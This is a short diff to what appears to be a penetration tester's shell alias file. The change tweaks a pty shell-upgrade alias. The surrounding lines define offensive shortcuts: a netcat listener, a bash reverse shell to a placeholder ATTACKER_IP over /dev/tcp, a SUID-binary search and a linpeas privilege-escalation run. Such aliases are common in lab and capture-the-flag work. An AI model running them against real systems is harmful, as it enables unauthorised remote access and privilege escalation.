@@ -88,7 +88,7 @@ alias pwncat='rlwrap nc -lvnp'
 alias revip='ip a | grep -E "inet\s"'
 alias revsh='bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
 alias shellz='python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
-alias upgrade='python3 -c "import pty; pty.spawn(\'/bin/bash\'); import os; os.system(\'export TERM=xterm\')"'
+alias upgrade='python3 -c "import pty; pty.spawn(\"/bin/bash\")"' # After running, manually type: export TERM=xterm
 alias suidbin='find / -perm -4000 -type f 2>/dev/null'
 alias linpeas='./linpeas.sh | tee linpeas.log'
 ```
